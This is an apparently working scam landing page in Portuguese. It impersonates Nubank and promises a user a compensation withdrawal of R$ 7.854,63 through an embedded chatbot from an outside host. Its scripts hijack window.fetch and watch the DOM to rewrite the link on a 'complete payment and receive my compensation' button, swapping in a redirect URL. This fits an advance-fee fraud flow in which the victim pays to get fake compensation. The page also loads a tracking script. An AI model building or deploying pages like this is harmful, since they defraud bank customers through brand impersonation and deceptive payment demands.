<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <script src="js/latest.js" data-utmify-prevent-subids="" async="" defer=""></script>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Saque da Indeniza√ß√£o</title>
  <!-- Substitua o CDN por um arquivo local em produ√ß√£o -->
  <link href="css/tailwind.css" rel="stylesheet">
</head>

<body class="bg-[#831BD1] min-h-screen flex flex-col">
  <header class="bg-white px-4 shadow-md">
    <div class="max-w-[1200px] mx-auto flex items-center gap-6">
      <img src="images/logo.svg" alt="Nubank" class="h-16 w-auto">
    </div>
  </header>

  <main class="flex-1 px-4 py-2">
    <div class="flex flex-col">
      <main>
        <div class="max-h-min">
          <div class="px-0.5 pb-[0.6rem]">
            <div class="bg-white border border-gray-300 rounded-md w-full h-[calc(100vh-80px)] overflow-hidden">
              <div class="px-4 pt-4 pb-0 text-center max-w-md mx-auto text-black">
                <p class="text-base">
                  <span>Ol√°, </span>
                  <span class="text-black font-bold">USU√°RIO!</span>
                </p>
                <p class="mt-1 text-sm">
                  Responda as perguntas abaixo para realizar<br>seu saque de <span>R$ 7.854,63</span>
                </p>
              </div>

              <!-- Typebot - Coloque o elemento ANTES do script -->
              <typebot-standard></typebot-standard>

              <script type="module">
                import { initStandard } from 'https://cdn.jsdelivr.net/npm/@typebot.io/js@0.3.86/dist/web.js';

                // Fun√ß√£o para garantir que o elemento existe
                function ensureTypebotElement() {
                  if (!document.querySelector('typebot-standard')) {
                    const typebotEl = document.createElement('typebot-standard');
                    document.querySelector('.overflow-hidden').appendChild(typebotEl);
                  }
                }

                async function initializeTypebot() {
                  try {
                    ensureTypebotElement();
                    
                    await initStandard({
                      typebot: "nub-1-mcrdbzs",
                      apiHost: "https://chat.typezap.site",
                    });
                    
                    console.log('Typebot inicializado com sucesso');
                    initRedirectionSystem();
                  } catch (error) {
                    console.error('Erro ao inicializar Typebot:', error);
                    // Tenta novamente ap√≥s 2 segundos
                    setTimeout(initializeTypebot, 2000);
                  }
                }

                // Inicia ap√≥s o DOM estar completamente carregado
                if (document.readyState === 'complete') {
                  initializeTypebot();
                } else {
                  window.addEventListener('load', initializeTypebot);
                }
              </script>

              <script>
              // Sistema de Redirecionamento
              function initRedirectionSystem() {
                const TARGET_TEXT = "Concluir pagamento e receber minha indeniza√ß√£o";
                const REDIRECT_URL = "https://google.com";
                
                // 1. Intercepta√ß√£o de API
                const originalFetch = window.fetch;
                window.fetch = async function(input, init) {
                  const url = typeof input === 'string' ? input : input.url;
                  if (url && url.includes('/continueChat')) {
                    try {
                      const response = await originalFetch.apply(this, arguments);
                      const clonedResponse = response.clone();
                      const data = await clonedResponse.json();
                      
                      if (JSON.stringify(data).includes(TARGET_TEXT)) {
                        data.messages = data.messages.map(msg => {
                          if (msg.content?.richText) {
                            msg.content.richText = msg.content.richText.map(rich => ({
                              ...rich,
                              children: rich.children.map(child => ({
                                ...child,
                                text: child.text?.replace(/https?:\/\/[^\s]+/g, REDIRECT_URL)
                              }))
                            }));
                          }
                          return msg;
                        });
                        console.log('‚úÖ Resposta da API modificada');
                        return new Response(JSON.stringify(data), response);
                      }
                      return response;
                    } catch (e) {
                      console.error('Erro ao interceptar API:', e);
                      return originalFetch.apply(this, arguments);
                    }
                  }
                  return originalFetch.apply(this, arguments);
                };

                // 2. Monitoramento do DOM
                const observer = new MutationObserver(mutations => {
                  mutations.forEach(mutation => {
                    mutation.addedNodes.forEach(node => {
                      if (node.nodeType === 1) {
                        scanAndReplaceInNode(node);
                      }
                    });
                  });
                });

                observer.observe(document.body, {
                  childList: true,
                  subtree: true,
                  attributes: true
                });

                // 3. Verifica√ß√£o inicial
                scanAndReplaceInDocument();
                
                console.log('üõ° Sistema de redirecionamento ativado');
              }

              function scanAndReplaceInDocument() {
                scanAndReplaceInNode(document);
                
                // Verifica no Shadow DOM
                const typebot = document.querySelector('typebot-standard');
                if (typebot?.shadowRoot) {
                  scanAndReplaceInNode(typebot.shadowRoot);
                }
              }

              function scanAndReplaceInNode(node) {
                const TARGET_TEXT = "Concluir pagamento e receber minha indeniza√ß√£o";
                const REDIRECT_URL = "https://google.com";
                
                try {
                  const elements = node.querySelectorAll 
                    ? node.querySelectorAll('a, button, [onclick]') 
                    : [];
                  
                  elements.forEach(el => {
                    if (el.textContent?.includes(TARGET_TEXT) && !el.dataset.intercepted) {
                      el.dataset.intercepted = 'true';
                      
                      if (el.tagName === 'A') {
                        el.href = REDIRECT_URL;
                        el.target = '_blank';
                      }
                      
                      el.onclick = function(e) {
                        e.preventDefault();
                        e.stopPropagation();
                        window.open(REDIRECT_URL, '_blank');
                      };
                      
                      console.log('üîó Elemento interceptado:', el);
                    }
                  });
                } catch (e) {
                  console.error('Erro ao verificar n√≥:', e);
                }
              }
              </script>
            </div>
          </div>
        </div>
      </main>
    </div>
  </main>
</body>
</html>
